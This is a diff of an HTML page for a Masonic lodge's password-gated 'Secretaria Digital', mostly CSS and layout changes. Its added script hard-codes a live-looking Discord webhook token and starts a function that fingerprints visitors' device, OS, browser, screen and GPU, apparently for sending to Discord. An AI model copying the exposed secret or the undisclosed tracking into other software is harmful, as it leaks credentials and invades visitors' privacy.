@@ -92,27 +92,20 @@
         /* --- TÍTULO COM TAMANHO UNIFICADO E ANIMAÇÃO PREMIUM --- */
         .page-title { 
             font-family: 'Cinzel', serif;
-            font-size: 2.1rem; /* Tamanho unificado no desktop */
+            font-size: 2.1rem; 
             line-height: 1.3; 
             letter-spacing: 2px; 
             margin-bottom: 5px; 
             text-transform: uppercase;
-            /* Degradê base */
-            background: linear-gradient(45deg, #d4af37, #fff, #5c0a0a, #d4af37, hsl(350, 100%, 44%)); /* COR DESTAQUE LOJA */
+            background: linear-gradient(45deg, #d4af37, #fff, #5c0a0a, #d4af37, hsl(350, 100%, 44%)); 
             background-size: 300% 300%;
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            /* Sombra suave fixa */
             filter: drop-shadow(0 2px 5px rgba(0,0,0,0.8));
-            /* A Animação de cor (Shimmer Bordo/Ouro) */
-            animation: premium-color-shift 25s ease infinite; /* TEMPO DO EFEITO LOJA */
+            animation: premium-color-shift 25s ease infinite; 
         }
 
-        /* Garante que os spans herdem o tamanho do h1 para ficarem todos iguais */
-        .page-title span {
-            font-size: 1em;
-            display: inline-block;
-        }
+        .page-title span { font-size: 1em; display: inline-block; }
         .no-wrap { white-space: nowrap; }
 
         @keyframes premium-color-shift {
@@ -123,8 +116,13 @@
         
         .subtitle { font-family: 'Lato', sans-serif; letter-spacing: 3px; font-size: 0.9rem; opacity: 0.8; margin-bottom: 30px; text-transform: uppercase; color: var(--gold-light); }
 
-        /* BUSCA RÁPIDA DE PROCESSOS */
-        .search-wrapper { margin-bottom: 25px; position: relative; max-width: 500px; margin-left: auto; margin-right: auto; width: 100%; }
+        /* CONTROLES DA BUSCA E MODO DE VISUALIZAÇÃO */
+        .controls-wrapper {
+            display: flex; justify-content: center; align-items: center; gap: 15px;
+            max-width: 600px; margin: 0 auto 25px; width: 100%;
+        }
+
+        .search-wrapper { position: relative; flex: 1; }
         .search-input {
             width: 100%; padding: 12px 50px 12px 20px; border-radius: 50px;
             background: rgba(255, 255, 255, 0.05); border: 1px solid var(--gold);
@@ -134,44 +132,70 @@
         .search-input:focus { background: rgba(255, 255, 255, 0.1); box-shadow: 0 0 20px rgba(212, 175, 55, 0.2); }
         .search-icon { position: absolute; right: 20px; top: 50%; transform: translateY(-50%); color: var(--gold); pointer-events: none; }
 
+        /* Botões de Toggle View */
+        .view-toggle-container {
+            display: flex; background: rgba(0,0,0,0.4); border-radius: 8px; border: 1px solid rgba(212, 175, 55, 0.3); overflow: hidden;
+        }
+        .view-btn {
+            background: transparent; color: rgba(255,255,255,0.5); border: none; padding: 10px 15px; font-size: 1.1rem; cursor: pointer; transition: 0.3s;
+        }
+        .view-btn.active { background: rgba(212, 175, 55, 0.2); color: var(--gold); }
+        .view-btn:hover:not(.active) { color: #fff; background: rgba(255,255,255,0.05); }
+
+
         .section-title { font-size: 0.8rem; text-transform: uppercase; letter-spacing: 2px; color: rgba(255,255,255,0.4); margin-bottom: 20px; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 10px; font-family: 'Lato', sans-serif; }
 
-        /* --- LISTA DE PROCESSOS (GRID SEGURO 3 COLUNAS) --- */
-        .process-list { 
+        /* --- LISTA DE PROCESSOS: GRID MODE --- */
+        .process-list.grid-mode { 
             display: grid; 
             grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); 
             gap: 15px; width: 100%; margin-bottom: 20px;
             justify-content: center; 
         }
 
-        .candidate-btn {
+        .process-list.grid-mode .candidate-btn {
             display: flex; align-items: center; justify-content: space-between; padding: 15px 20px; 
             border: 1px solid rgba(212, 175, 55, 0.4); background: linear-gradient(45deg, rgba(0, 42, 82, 0.6), rgba(0, 20, 40, 0.9)); 
             color: var(--gold-light); text-decoration: none; border-radius: 8px;
             transition: all 0.3s; backdrop-filter: blur(5px); box-shadow: 0 5px 15px rgba(0,0,0,0.3);
             position: relative; overflow: hidden; box-sizing: border-box;
-            width: 100%; max-width: 400px; justify-self: center; /* Impede o botão de esticar na busca */
+            width: 100%; max-width: 400px; justify-self: center; 
         }
         
-        .candidate-btn:hover:not(.locked) { background: rgba(0, 42, 82, 0.9); transform: translateY(-3px); border-color: var(--gold); box-shadow: 0 10px 25px rgba(212, 175, 55, 0.2); }
-        .candidate-btn.locked { opacity: 0.8; cursor: default; }
-        .candidate-btn.locked:hover { transform: none; box-shadow: 0 5px 15px rgba(0,0,0,0.3); border-color: rgba(212, 175, 55, 0.4); background: linear-gradient(45deg, rgba(0, 42, 82, 0.6), rgba(0, 20, 40, 0.9));}
+        .process-list.grid-mode .cand-info { text-align: left; display: flex; align-items: flex-start; gap: 15px; flex: 1; min-width: 0; }
+        .process-list.grid-mode .cand-icon { font-size: 1.5rem; color: var(--gold); width: 30px; text-align: center; flex-shrink: 0; margin-top: 2px;}
+        .process-list.grid-mode .cand-text-group { display: flex; flex-direction: column; flex: 1; min-width: 0; }
+        .process-list.grid-mode .cand-name { font-size: 0.95rem; font-weight: bold; font-family: 'Lato', sans-serif; color: #fff; white-space: normal; word-wrap: break-word; line-height: 1.3; margin-bottom: 5px; }
+        .process-list.grid-mode .cand-status { font-size: 0.7rem; text-transform: uppercase; letter-spacing: 1px; opacity: 0.8; font-family: 'Lato', sans-serif; white-space: normal; word-wrap: break-word; display: flex; align-items: center; line-height: 1.2;}
 
-        /* Estrutura para os nomes QUEBRAREM LINHA sem cortar */
-        .cand-info { text-align: left; display: flex; align-items: flex-start; gap: 15px; flex: 1; min-width: 0; }
-        .cand-icon { font-size: 1.5rem; color: var(--gold); width: 30px; text-align: center; flex-shrink: 0; margin-top: 2px;}
-        .cand-icon.locked-icon { color: #888; }
-        
-        .cand-text-group { display: flex; flex-direction: column; flex: 1; min-width: 0; }
-        
-        /* Quebra de linha ativada para nomes grandes. Fim das reticências (...) no nome. */
-        .cand-name { font-size: 0.95rem; font-weight: bold; font-family: 'Lato', sans-serif; color: #fff; white-space: normal; word-wrap: break-word; line-height: 1.3; margin-bottom: 5px; }
-        .cand-status { font-size: 0.7rem; text-transform: uppercase; letter-spacing: 1px; opacity: 0.8; font-family: 'Lato', sans-serif; white-space: normal; word-wrap: break-word; display: flex; align-items: center; line-height: 1.2;}
+        /* --- LISTA DE PROCESSOS: TABLE MODE --- */
+        .process-list.table-mode {
+            display: flex; flex-direction: column; gap: 8px; width: 100%; max-width: 900px; margin: 0 auto 20px;
+        }
 
-        .arrow { font-size: 1rem; opacity: 0.5; transition: transform 0.3s; flex-shrink: 0; margin-left: 10px; align-self: center;}
+        .process-list.table-mode .candidate-btn {
+            display: grid; grid-template-columns: 40px minmax(150px, 2fr) minmax(120px, 1fr) 30px; align-items: center; padding: 12px 20px;
+            border: 1px solid rgba(212, 175, 55, 0.2); background: rgba(0, 20, 40, 0.7); 
+            color: var(--gold-light); text-decoration: none; border-radius: 4px;
+            transition: all 0.2s; box-sizing: border-box; width: 100%;
+        }
+
+        .process-list.table-mode .cand-info { display: contents; } /* Ignora a div container no CSS Grid da tabela */
+        .process-list.table-mode .cand-icon { font-size: 1.2rem; color: var(--gold); text-align: left; }
+        .process-list.table-mode .cand-text-group { display: contents; }
+        
+        .process-list.table-mode .cand-name { font-size: 0.9rem; font-weight: bold; font-family: 'Lato', sans-serif; color: #fff; text-align: left; padding-right: 15px;}
+        .process-list.table-mode .cand-status { font-size: 0.7rem; text-transform: uppercase; letter-spacing: 1px; opacity: 0.9; text-align: left; display: flex; align-items: center;}
+
+        /* ESTILOS COMUNS AOS DOIS MODOS */
+        .candidate-btn:hover:not(.locked) { background: rgba(0, 42, 82, 0.9); transform: translateY(-2px); border-color: var(--gold); box-shadow: 0 5px 15px rgba(212, 175, 55, 0.2); }
+        .candidate-btn.locked { opacity: 0.6; cursor: not-allowed; }
+        .candidate-btn.locked:hover { transform: none; box-shadow: none; background: rgba(0, 20, 40, 0.7); border-color: rgba(212, 175, 55, 0.2);}
+        .locked-icon { color: #666 !important; }
+
+        .arrow { font-size: 1rem; opacity: 0.5; transition: transform 0.3s; flex-shrink: 0; justify-self: flex-end;}
         .candidate-btn:not(.locked):hover .arrow { transform: translateX(5px); opacity: 1; color: var(--gold); }
-
-        .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-right: 6px; flex-shrink: 0; }
+        .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-right: 8px; flex-shrink: 0; }
         
         /* Botão Carregar Mais */
         .btn-load-more {
@@ -182,13 +206,13 @@
         }
         .btn-load-more:hover { background: var(--gold); color: #000; box-shadow: 0 0 15px var(--gold-shadow); }
 
-        /* Botão Extra - Histórico (TRACEJADO ELEGANTE) */
+        /* Botão Extra - Histórico */
         .btn-history-container { width: 100%; display: flex; justify-content: center; margin-top: 30px; }
         .btn-history {
             display: inline-flex; align-items: center; justify-content: center; gap: 8px;
             padding: 12px 25px; border-radius: 8px;
             background: rgba(0,0,0,0.4); 
-            border: 2px dashed var(--gold); /* Tracejado garantido e mais visível */
+            border: 2px dashed var(--gold); 
             color: var(--gold); text-decoration: none; font-family: 'Cinzel'; font-weight: bold; letter-spacing: 1px; 
             transition: 0.3s; font-size: 0.85rem; text-transform: uppercase;
         }
@@ -196,7 +220,7 @@
             background: rgba(212, 175, 55, 0.15); 
             color: #fff; 
             box-shadow: 0 0 15px var(--gold-shadow); 
-            border-style: solid; /* Fica sólido só ao passar o mouse */
+            border-style: solid; 
         }
 
         /* --- ABÓBADA CELESTE (100% CSS) --- */
@@ -213,10 +237,9 @@
             background-repeat: repeat;
             background-size: 200px 200px; 
             opacity: 0.7; 
-            animation: starMove 700s linear infinite; /* VELOCIDADE DO PRIMEIRO PONTO */
+            animation: starMove 700s linear infinite; 
         }
         
-        /* Segunda camada para criar profundidade e movimento cruzado */
         .bg-particles::after {
             content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
             background-image: 
@@ -228,7 +251,7 @@
             background-size: 250px 250px;
             opacity: 0.4; 
             transform: scale(1.2) rotate(15deg); 
-            animation: starMove 200s linear infinite reverse;  /* VELOCIDADE DO SEGUNDO PONTO */
+            animation: starMove 200s linear infinite reverse;  
         }
 
         @keyframes starMove {
@@ -241,68 +264,132 @@
             to { opacity: 1; transform: translateY(0); }
         }
 
-        /* --- SISTEMA DE LOGIN --- */
+        /* --- SISTEMA DE LOGIN PADRÃO DOSSIÊ --- */
         #login-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 12, 24, 0.95); backdrop-filter: blur(10px);
-            z-index: 2000; display: flex; flex-direction: column; align-items: center; justify-content: center;
-            transition: opacity 0.5s;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100vh;
+            background: rgba(0, 5, 10, 0.98); z-index: 9999; 
+            display: flex; justify-content: center; align-items: center;
+            transition: opacity 0.5s ease; backdrop-filter: blur(10px);
         }
-        .login-box {
-            background: rgba(0, 0, 0, 0.8); border: 1px solid var(--gold);
-            padding: 40px; border-radius: 8px; text-align: center; box-shadow: 0 0 30px rgba(212, 175, 55, 0.2);
-            width: 90%; max-width: 400px;
-        }
-        .login-box i.fa-lock { font-size: 3rem; margin-bottom: 20px; color: var(--gold); }
-        .login-box h2 { font-family: 'Cinzel'; font-size: 1.5rem; margin-bottom: 20px; color: var(--gold); }
         
-        .login-input {
-            width: 100%; padding: 15px; background: rgba(255,255,255,0.1); border: 1px solid rgba(212,175,55,0.5);
-            color: #fff; font-family: 'Lato'; font-size: 1rem; border-radius: 4px; margin-bottom: 20px;
-            outline: none; text-align: center; letter-spacing: 5px;
+        .auth-box {
+            text-align: center; 
+            border: 1px solid rgba(212, 175, 55, 0.15); 
+            padding: 40px 30px; 
+            border-radius: 16px; 
+            background: rgba(0, 12, 24, 0.65); 
+            width: 90%; 
+            max-width: 420px; 
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8), 0 0 20px rgba(212, 175, 55, 0.05); 
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            animation: popIn 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards; 
+            position: relative; 
+            overflow: hidden;
+            margin: auto;
         }
-        .login-input:focus { border-color: var(--gold); box-shadow: 0 0 10px var(--gold-shadow); }
         
-        .login-btn {
-            background: var(--gold); color: #000; font-family: 'Cinzel'; font-weight: bold;
-            padding: 12px 30px; border: none; border-radius: 4px; cursor: pointer; transition: 0.3s;
-            width: 100%; font-size: 1.1rem; text-transform: uppercase; margin-bottom: 15px;
+        .auth-box::after {
+            content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
+            background: linear-gradient(to bottom right, transparent, transparent, rgba(212, 175, 55, 0.05), transparent, transparent);
+            transform: rotate(45deg); animation: shimmer 4s infinite;
         }
-        .login-btn:hover { background: #fff; box-shadow: 0 0 15px var(--gold-shadow); }
+
+        .auth-logo-img { max-width: 80px; height: auto; margin-bottom: 15px; filter: drop-shadow(0 0 15px rgba(212, 175, 55, 0.4)); animation: floatLogo 4s ease-in-out infinite; }
+        @keyframes floatLogo { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-5px); } }
+
+        .auth-box h2 { font-family: 'Cinzel', serif; font-size: 1.5rem; margin-bottom: 5px; color: var(--gold); }
+        .auth-subtitle { font-family: 'Lato', sans-serif; color: #ccc; font-size: 0.85rem; margin-bottom: 25px; letter-spacing: 1px;}
+
+        .input-group {
+            position: relative;
+            margin-bottom: 30px;
+            width: 100%;
+        }
+
+        .auth-input {
+            width: 100%; 
+            padding: 15px 40px 15px 15px;
+            font-size: 1.2rem; 
+            border: 1px solid rgba(212, 175, 55, 0.3); 
+            border-radius: 8px;
+            background: rgba(0, 0, 0, 0.3); 
+            color: var(--gold); 
+            text-align: center; 
+            outline: none;
+            letter-spacing: 4px; 
+            transition: all 0.3s ease;
+            font-family: 'Lato', sans-serif;
+        }
         
-        .btn-voltar-inicio {
-            display: inline-flex; justify-content: center; align-items: center; gap: 8px;
-            width: 100%; padding: 12px;
-            background: transparent; border: 1px solid rgba(212, 175, 55, 0.5); border-radius: 4px;
-            color: var(--gold); text-decoration: none; font-family: 'Cinzel'; font-size: 0.8rem;
-            transition: 0.3s; text-transform: uppercase; letter-spacing: 1px;
+        .auth-input:focus { 
+            border-color: var(--gold); 
+            background: rgba(0, 0, 0, 0.6);
+            box-shadow: 0 0 0 3px rgba(212, 175, 55, 0.1); 
         }
-        .btn-voltar-inicio:hover { background: rgba(212, 175, 55, 0.1); border-color: var(--gold); }
+        
+        .auth-input::placeholder {
+            font-family: 'Lato', sans-serif;
+            font-size: 0.85rem;
+            letter-spacing: 2px;
+            color: rgba(212, 175, 55, 0.4);
+        }
+
+        .auth-btn {
+            display: block; width: 100%; padding: 14px 20px; 
+            background: linear-gradient(135deg, var(--gold) 0%, #a68427 100%); 
+            color: #001529; font-family: 'Cinzel', serif; font-weight: bold; 
+            border: none; border-radius: 8px; 
+            cursor: pointer; transition: all 0.3s ease; 
+            text-transform: uppercase; letter-spacing: 2px; font-size: 0.95rem;
+            margin-bottom: 20px;
+        }
+        
+        .auth-btn:hover { 
+            transform: translateY(-2px); 
+            box-shadow: 0 10px 20px rgba(212, 175, 55, 0.2); 
+        }
+
+        .btn-voltar {
+            width: 100%; padding: 10px; background: transparent; border: 1px solid rgba(212, 175, 55, 0.3); border-radius: 6px;
+            color: var(--gold); text-decoration: none; font-family: 'Cinzel'; font-size: 0.75rem;
+            transition: 0.3s; text-transform: uppercase; letter-spacing: 1px; display: inline-flex; align-items: center; justify-content: center; gap: 5px;
+            position: relative; z-index: 10;
+        }
+        .btn-voltar:hover { background: rgba(212, 175, 55, 0.1); border-color: var(--gold); }
 
         .error-msg { color: #ff4c4c; font-family: 'Lato'; font-size: 0.85rem; margin-bottom: 15px; display: none; height: 20px; }
+
+        @keyframes popIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
+        @keyframes shimmer { 0% { left: -50%; top: -50%; } 100% { left: 150%; top: 150%; } }
 
         /* --- TELA DE BLOQUEIO DO SISTEMA (ESTILO HACKER) --- */
         #system-lock-screen {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #000; color: #0f0; font-family: 'Courier New', Courier, monospace;
+            background: radial-gradient(circle at center, #2a0000 0%, #000 100%);
+            color: #ff3333; font-family: monospace;
             display: none; flex-direction: column; justify-content: center; align-items: center;
             z-index: 100000; padding: 20px; text-align: center; overflow: hidden;
+            backdrop-filter: blur(10px);
         }
-        #system-lock-screen.active { display: flex; animation: glitch-anim 0.2s linear infinite; }
-        .lock-title { font-size: 2rem; color: #f00; margin-bottom: 20px; text-transform: uppercase; font-weight: bold; }
-        .lock-text { font-size: 1rem; color: #0f0; margin-bottom: 10px; }
-        .lock-progress { width: 80%; max-width: 300px; height: 15px; border: 1px solid #0f0; margin-top: 20px; position: relative; }
-        .lock-progress-bar { height: 100%; background: #f00; width: 0%; animation: fill-bar 3s linear forwards; }
+        #system-lock-screen.active { display: flex; animation: glitch-anim 0.4s infinite; }
+        
+        .lock-icon { font-size: clamp(3rem, 10vw, 5rem); margin-bottom: 20px; animation: pulse-danger 1s infinite; filter: drop-shadow(0 0 20px rgba(255, 0, 0, 0.8)); }
+        .lock-title { font-family: 'Cinzel', serif; font-size: clamp(1.5rem, 5vw, 2.5rem); letter-spacing: 4px; text-shadow: 0 0 15px rgba(255, 0, 0, 0.6); margin-bottom: 15px; }
+        .lock-text { font-size: clamp(0.8rem, 3vw, 1rem); color: #ff9999; letter-spacing: 2px; min-height: 24px; line-height: 1.5; }
+        .lock-text::after { content: '|'; animation: blink-cursor 0.7s infinite; }
 
-        @keyframes glitch-anim { 0%, 100% { transform: translate(0) } 20% { transform: translate(-2px, 1px) } 40% { transform: translate(-1px, -1px) } 80% { transform: translate(1px, -1px) } }
-        @keyframes fill-bar { to { width: 100%; } }
+        @keyframes pulse-danger { 0%, 100% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.1); opacity: 0.8; } }
+        @keyframes blink-cursor { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
+        @keyframes glitch-anim { 0%, 100% { transform: translate(0) } 20% { transform: translate(-2px, 2px) } 40% { transform: translate(-2px, -2px) } 60% { transform: translate(2px, 2px) } 80% { transform: translate(2px, -2px) } }
+        
         body.locked-mode > *:not(#system-lock-screen) { display: none !important; }
 
         /* --- FOOTER PADRÃO MOSAICO --- */
         footer { 
             position: relative; 
-			z-index: 10; /* PARA NÃO QUEBRAR ESTRELAS NO RODAPÉ */
-			width: 100%; background-color: #02050a; 
+            z-index: 10; 
+            width: 100%; background-color: #02050a; 
             background-image: 
                 linear-gradient(45deg, rgba(255,255,255,0.06) 25%, transparent 25%, transparent 75%, rgba(255,255,255,0.06) 75%, rgba(255,255,255,0.06)),
                 linear-gradient(45deg, rgba(255,255,255,0.06) 25%, transparent 25%, transparent 75%, rgba(255,255,255,0.06) 75%, rgba(255,255,255,0.06));
@@ -342,21 +429,28 @@
         }
         .cookie-banner.show { transform: translateY(0); }
         .cookie-text { font-size: 0.9rem; color: #ccc; max-width: 800px; text-align: center; line-height: 1.4;}
-        .cookie-btn { background: var(--gold); color: #000; border: none; padding: 12px 25px; font-weight: bold; cursor: pointer; border-radius: 4px; transition: 0.3s; }
+        .cookie-btn { background: var(--gold); color: #000; border: none; padding: 12px 25px; font-weight: bold; cursor: pointer; border-radius: 4px; transition: 0.3s; text-transform: uppercase; font-size: 0.75rem;}
 
         @media (max-width: 900px) {
             .brasao-container { width: 100px; height: 100px; margin-bottom: 15px; } 
-            
-            /* TÍTULO MOBILE: Mesmo tamanho (5.5vw) para as três linhas. Cabe perfeito sem cortar. */
             .page-title { line-height: 1.4; margin-bottom: 15px; font-size: 5.5vw; } 
-            
             p.subtitle { font-size: 0.75rem; letter-spacing: 2px; margin-bottom: 25px; }
             
-            /* Correção Card no Mobile: 1 coluna segura */
-            .process-list { grid-template-columns: 1fr; gap: 10px; width: 100%; padding: 0 10px; box-sizing: border-box;}
-            .candidate-btn { padding: 12px 15px; width: 100%; max-width: 100%; box-sizing: border-box; } 
+            /* Ajustes Mobile para Busca e Controles */
+            .controls-wrapper { flex-direction: column; padding: 0 10px; }
+            .view-toggle-container { width: 100%; justify-content: center; }
+            .view-btn { flex: 1; }
+
+            /* Grid e Table mode no mobile se comportam igual 1 coluna */
+            .process-list.grid-mode, .process-list.table-mode { grid-template-columns: 1fr; gap: 10px; width: 100%; padding: 0 10px; box-sizing: border-box; display: grid;}
             
-            /* Ajuste Header e Menu Mobile (Toggle) */
+            .process-list.table-mode .candidate-btn, .process-list.grid-mode .candidate-btn { 
+                display: flex; flex-direction: row; padding: 12px 15px; width: 100%; max-width: 100%; box-sizing: border-box; 
+            }
+            .process-list.table-mode .cand-info, .process-list.grid-mode .cand-info { display: flex; align-items: center; }
+            .process-list.table-mode .cand-text-group, .process-list.grid-mode .cand-text-group { display: flex; flex-direction: column; }
+            .process-list.table-mode .cand-status { margin-top: 5px; }
+            
             .header-inner { padding: 0 15px; flex-wrap: nowrap; justify-content: space-between; }
             .logo-img { height: 40px; }
             
@@ -387,22 +481,28 @@
 <body>
 
     <div id="system-lock-screen">
+        <i class="fas fa-shield-alt lock-icon"></i>
         <div class="lock-title">VIOLAÇÃO DE SEGURANÇA</div>
-        <div class="lock-text">ACESSO NEGADO. TENTATIVAS ESGOTADAS.</div>
-        <div class="lock-text">RASTREANDO IP E REDIRECIONANDO...</div>
-        <div class="lock-progress"><div class="lock-progress-bar"></div></div>
+        <p id="lockdown-typing" class="lock-text"></p>
     </div>
 
+    <audio id="lockdown-audio" src="../song/alarme.mp3" preload="auto"></audio>
+
     <div id="login-overlay">
-        <div class="login-box">
-            <i class="fas fa-feather-alt role-icon " style="font-size: 3rem; color:var(--gold); margin-bottom:20px"></i>
-            <h1>Secretaria</h1>
-<br>            
-            <p style="font-family: 'Lato'; color: #ccc; font-size: 0.9rem; margin-bottom: 20px;">Sou majestade elevada ao máximo. Quem sou?</p>
+        <div class="auth-box">
+            <img src="../imagens/264.webp" alt="264" class="auth-logo-img" onerror="this.src='../264.jpg'">
+            <h2>Secretaria Digital</h2>
+            <p class="auth-subtitle">Sou majestade elevada ao máximo. Quem sou?</p>
+            
             <div id="error-msg" class="error-msg">Palavra Incorreta. Tentativas: <span id="tentativas">0</span>/3</div>
-            <input type="password" id="pass-input" class="login-input" placeholder="••••••••" autocomplete="off" autofocus>
-            <button id="btn-login" class="login-btn">Entrar</button>
-            <a href="https://oimaginista.com/fraternidadeimperial/" class="btn-voltar-inicio"><i class="fas fa-home"></i> Fraternidade Imperial</a>
+            
+            <div class="input-group">
+                <input type="password" id="pass-input" class="auth-input" placeholder="SENHA" autocomplete="off" autofocus>
+                <i class="fas fa-eye" id="togglePassword" style="position: absolute; right: 15px; top: 18px; color: rgba(212, 175, 55, 0.6); cursor: pointer; transition: 0.3s;"></i>
+            </div>
+            
+            <button id="btn-login" class="auth-btn">Acessar Arquivos</button>
+            <a href="https://oimaginista.com/fraternidadeimperial/" class="btn-voltar"><i class="fas fa-home"></i> Início</a>
         </div>
     </div>
 
@@ -437,14 +537,21 @@
         
         <p class="subtitle">Secretaria Digital</p>
         
-        <div class="search-wrapper">
-            <input type="text" id="process-search" class="search-input" placeholder="Buscar candidato ou status...">
-            <i class="fas fa-search search-icon"></i>
+        <div class="controls-wrapper">
+            <div class="search-wrapper">
+                <input type="text" id="process-search" class="search-input" placeholder="Buscar candidato ou status...">
+                <i class="fas fa-search search-icon"></i>
+            </div>
+            
+            <div class="view-toggle-container">
+                <button id="btn-view-grid" class="view-btn active" title="Visualização em Grade"><i class="fas fa-th-large"></i></button>
+                <button id="btn-view-table" class="view-btn" title="Visualização em Lista"><i class="fas fa-list"></i></button>
+            </div>
         </div>
 
-        <div class="section-title">Processos de Iniciação Ativos</div>
+        <div class="section-title">Processos em Andamento</div>
         
-        <div class="process-list" id="process-list-container">
+        <div class="process-list grid-mode" id="process-list-container">
             </div>
         
         <button id="btn-load-more" class="btn-load-more">Ver Mais Processos <i class="fas fa-chevron-down" style="margin-left: 5px;"></i></button>
@@ -460,35 +567,35 @@
         </div>
     </div>
 
-        <footer id="secretaria-footer">
-            <div class="footer-grid">
-                <div class="footer-col mobile-center-col">
-                    <h4>Fale Conosco</h4>
-                    <div class="footer-contact">
-                        <p><i class="fas fa-map-pin"></i> <span>Rua Nair Tefé, 320 - Quitandinha, <br class="mobile-break-footer"><span class="keep-together">Petrópolis - RJ</span></span></p>
-                        <p><i class="fas fa-clock"></i> <span>Reuniões: Sábados (Quinzenalmente) às 10h</span></p>
-                        <p><i class="fas fa-envelope"></i> <span>secretaria@fraternidadeimperial264.com.br</span></p>
-                    </div>
+    <footer id="secretaria-footer">
+        <div class="footer-grid">
+            <div class="footer-col mobile-center-col">
+                <h4>Fale Conosco</h4>
+                <div class="footer-contact">
+                    <p><i class="fas fa-map-pin"></i> <span>Rua Nair Tefé, 320 - Quitandinha, <br class="mobile-break-footer"><span class="keep-together">Petrópolis - RJ</span></span></p>
+                    <p><i class="fas fa-clock"></i> <span>Reuniões: Sábados (Quinzenalmente) às 10h</span></p>
+                    <p><i class="fas fa-envelope"></i> <span>secretaria@fraternidadeimperial264.com.br</span></p>
                 </div>
-                <div class="footer-col footer-social-center">
-                    <h4>Redes Sociais</h4>
-                    <div class="social-icons">
-                        <a href="https://www.instagram.com/fraternidadeimperial264" target="_blank" class="social-btn" title="Instagram"><i class="fab fa-instagram"></i></a>
-                        <a href="#" class="social-btn" title="YouTube (Em breve)"><i class="fab fa-youtube"></i></a>
-                    </div>
-                </div>
-                 <div class="footer-col footer-dev-right">
-                    <span style="font-size:0.8rem; color:#aaa; margin-bottom:5px; text-shadow: 0 1px 2px #000;">Desenvolvido por:</span>
-                    <a href="https://oimaginista.com" target="_blank">
-                    <img src="../imagens/logo.png" alt="O Imaginista" class="dev-logo" onerror="this.src='../imagens/logo.png'">
-                </a>
             </div>
+            <div class="footer-col footer-social-center">
+                <h4>Redes Sociais</h4>
+                <div class="social-icons">
+                    <a href="https://www.instagram.com/fraternidadeimperial264" target="_blank" class="social-btn" title="Instagram"><i class="fab fa-instagram"></i></a>
+                    <a href="#" class="social-btn" title="YouTube (Em breve)"><i class="fab fa-youtube"></i></a>
+                </div>
+            </div>
+                <div class="footer-col footer-dev-right">
+                <span style="font-size:0.8rem; color:#aaa; margin-bottom:5px; text-shadow: 0 1px 2px #000;">Desenvolvido por:</span>
+                <a href="https://oimaginista.com" target="_blank">
+                <img src="../imagens/logo.png" alt="O Imaginista" class="dev-logo" onerror="this.src='../imagens/logo.png'">
+            </a>
         </div>
-            <div class="copyright">
-                <span>© 2026 A∴ R∴ L∴ M∴ Fraternidade Imperial Nº 264. <br class="mobile-break-footer">Todos os direitos reservados.</span>
-                <span>CNPJ: 00.000.000/0000-00</span>
-            </div>
-        </footer>
+    </div>
+        <div class="copyright">
+            <span>© 2026 A∴ R∴ L∴ M∴ Fraternidade Imperial Nº 264. <br class="mobile-break-footer">Todos os direitos reservados.</span>
+            <span>CNPJ: 00.000.000/0000-00</span>
+        </div>
+    </footer>
 
     <div id="cookie-banner" class="cookie-banner">
         <div class="cookie-text">
@@ -499,18 +606,128 @@
     </div>
 
     <script>
+        // =========================================================
+        // WEBHOOK DISCORD & COLETA DE DADOS AVANÇADOS
+        // =========================================================
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1476024935347654829/MQA4IE8XBQ7zYj26fLWxar75Oh2VrDoHL-drFoz-Ohd7heboOwFftHW22yEanPSXRU8T";
+        let camposDiscord = [];
+        let horaLogin = null; 
+
+        function obterDadosDispositivo() {
+            const ua = navigator.userAgent;
+            let os = "Desconhecido"; let browser = "Desconhecido"; let device = "Desktop"; let brand = "";
+
+            if (/iPhone/.test(ua)) brand = "Apple iPhone"; else if (/iPad/.test(ua)) brand = "Apple iPad"; else if (/Macintosh/.test(ua)) brand = "Apple Mac"; else if (/SM-|SAMSUNG/.test(ua)) brand = "Samsung Galaxy"; else if (/Moto|XT/.test(ua)) brand = "Motorola"; else if (/Xiaomi|Redmi|POCO/.test(ua)) brand = "Xiaomi";
+            if (/android/i.test(ua)) os = "Android"; else if (/iPad|iPhone|iPod/.test(ua)) os = "iOS"; else if (/Windows NT 10.0/.test(ua)) os = "Windows 10/11"; else if (/Windows NT/.test(ua)) os = "Windows"; else if (/Mac OS X/.test(ua)) os = "macOS"; else if (/Linux/.test(ua)) os = "Linux";
+            if (/mobile/i.test(ua)) device = "Smartphone"; else if (/tablet|ipad/i.test(ua)) device = "Tablet";
+            if (/edg/i.test(ua)) browser = "Edge"; else if (/chrome|crios/i.test(ua)) browser = "Chrome"; else if (/firefox|fxios/i.test(ua)) browser = "Firefox"; else if (/safari/i.test(ua) && !/chrome|crios/i.test(ua)) browser = "Safari"; else if (/opr\//i.test(ua)) browser = "Opera";
+            
+            let hardwareExtra = "";
+            if (device === "Desktop") {
+                const w = window.screen.width; const h = window.screen.height;
+                hardwareExtra = `\n🖥️ Resolução: ${w}x${h}`;
+                try {
+                    const canvas = document.createElement('canvas'); const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (gl) {
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        if (debugInfo) { let gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL); gpu = gpu.replace(/ANGLE \(|\)|Direct3D11 vs_5_0 ps_5_0/g, '').trim(); hardwareExtra += `\n⚙️ GPU: ${gpu}`; }
+                    }
+                } catch(e) {}
+            }
+            let deviceInfo = brand ? `${brand} (${device})` : device;
+            return `${deviceInfo} • ${os} • ${browser}${hardwareExtra}`;
+        }
+
